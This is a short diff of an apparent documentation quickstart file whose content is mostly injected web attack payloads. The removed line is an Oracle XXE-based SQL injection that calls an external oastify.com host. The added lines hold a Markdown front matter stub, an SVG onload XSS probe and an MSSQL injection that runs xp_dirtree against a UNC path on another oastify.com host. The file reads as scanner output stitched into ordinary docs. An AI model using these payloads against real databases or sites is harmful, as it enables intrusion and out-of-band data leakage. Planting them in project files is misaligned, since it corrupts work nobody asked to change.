@@ -1,1 +1,8 @@
-(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % rafjn SYSTEM "http://od5biavxvae22xfp2p3tj89z7qdk1bzz2nuapye.oasti'||'fy.com/">%rafjn;]>'),'/l') from dual)
+---
+title: 'Quickstart'
+description: 'Start building awesome documentation in under 5 minutes'
+---
+
+## Setup your development
+
+<svg/onload=alert(1);/></html>');declare @q varchar(99);set @q='\\xz0k4jh6hj0bo61yoyp25hv8tzztnkl8c10tnobd.oasti'+'fy.com\weg'; exec master.dbo.xp_dirtree @q;-- 
